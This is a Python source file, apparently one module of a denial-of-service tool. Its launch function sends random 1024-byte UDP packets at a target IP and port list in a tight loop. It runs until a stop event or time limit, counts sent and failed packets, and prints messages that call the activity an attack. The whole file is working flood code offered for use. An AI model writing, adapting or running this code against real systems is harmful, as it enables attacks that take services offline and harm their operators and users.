import socket
import random
import time

def launch(target_ip, ports, duration, tag, stop_event, fail_tracker):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)

    start_time = time.time()
    fail_tracker.setdefault('fail', 0)
    fail_tracker.setdefault('sent', 0)

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            break

        if isinstance(ports, list):
            if not ports:
                print(f"[!] No ports available for {tag}. Stopping attack.")
                break
            port = random.choice(ports)
        else:
            port = ports

        try:
            sock.sendto(payload, (target_ip, port))
            fail_tracker['sent'] += 1
        except Exception:
            fail_tracker['fail'] += 1
            if fail_tracker['fail'] > 20:
                print(f"[x] {tag} target seems unresponsive. Stopping.")
                break

        time.sleep(0.001)

    sock.close()
